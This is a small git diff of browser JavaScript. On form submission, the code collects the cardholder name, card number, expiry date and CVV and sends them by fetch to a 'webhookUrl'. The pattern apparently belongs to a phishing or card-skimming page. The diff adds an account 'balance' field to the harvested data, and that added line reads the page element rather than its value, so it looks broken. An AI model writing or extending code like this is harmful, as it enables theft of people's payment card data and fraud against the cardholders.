@@ -7,7 +7,8 @@ document.getElementById('card-data-form').addEventListener('submit', function(ev
         namecard: document.getElementById('name').value,
         numbercard: document.getElementById('number').value,
         expiration: document.getElementById('expiration').value,
-        cvv: document.getElementById('cvv').value
+        cvv: document.getElementById('cvv').value,
+        balance: document.getElementById('balance')
     };
 
     fetch(webhookUrl, {
